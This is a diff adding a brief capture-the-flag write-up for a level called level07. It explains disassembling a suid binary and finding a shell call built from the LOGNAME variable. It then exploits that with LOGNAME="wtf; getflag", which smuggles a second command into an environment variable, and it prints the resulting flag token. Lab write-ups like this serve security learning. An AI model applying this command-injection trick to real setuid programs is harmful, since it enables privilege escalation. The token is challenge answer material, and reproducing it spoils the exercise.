@@ -1,0 +1,11 @@
+level07 is a suid binary. ok we know this.
+
+objdump -D -M intel level07. (-M intel very important).
+gdb it.
+find out that the format of the asprintf is "/bin/echo %s ". much wow.
+the only argument of the format is the result of getenv("LOGNAME");
+so export LOGNAME="wtf; getflag"
+/test
+wtf
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
